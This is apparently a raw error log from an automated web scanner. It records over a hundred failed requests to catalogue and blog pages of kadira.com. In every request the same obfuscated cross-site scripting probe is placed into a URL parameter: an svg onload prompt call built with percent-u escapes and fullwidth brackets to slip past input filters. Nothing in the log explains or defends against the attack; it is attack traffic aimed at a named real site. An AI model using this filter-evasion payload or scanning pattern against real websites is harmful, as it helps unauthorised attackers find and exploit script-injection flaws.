Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=26&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=9: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=28&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=8: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=28&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=7: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=28&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=5: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=28&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=4: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=28&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=15: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=27&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=14: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=27&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=13: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=27&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=12: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=27&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=11: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=27&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=10: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=27&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CAT=Notas+de+prensa: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?IDcat=12&CAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/blog.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CAT=Notas+de+prensa: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/blog.php?IDcat=12&CAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CAT=Ergonom?a: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?IDcat=10&CAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?pageNum_Recordset1=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&totalRows_Recordset1=24: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?pageNum_Recordset1=1&totalRows_Recordset1=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Junio+2014: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=June+2014&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Mayo+2014: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=May+2014&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Abril+2014: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=April+2014&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Abril+2013: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=April+2013&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Septiembre+2012: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=September+2012&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Julio+2012: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=July+2012&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Junio+2012: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=June+2012&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Mayo+2012: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=May+2012&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Noviembre+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=November+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Octubre+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=October+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Septiembre+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=September+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Agosto+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=August+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Julio+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=July+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Marzo+2009: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=March+2009&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Noviembre+2007: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=November+2007&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Abril+2006: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=April+2006&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
